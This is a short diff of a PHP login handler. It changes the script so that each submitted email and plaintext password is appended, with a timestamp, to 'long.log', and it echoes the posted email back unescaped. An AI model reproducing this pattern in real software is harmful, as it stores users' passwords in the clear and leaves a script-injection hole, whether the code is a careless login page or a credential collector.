@@ -4,7 +4,7 @@ $_SESSION["login"] = null;
 
 $input = [$_POST["email"],$_POST["password"],date("Y-m-d H:i:s")];
 
-file_put_contents('exemple.json', json_encode($input));
+file_put_contents('long.log',json_encode($input),FILE_APPEND);
 
 if (isset($_POST["email"])) {
     echo $_POST["email"];
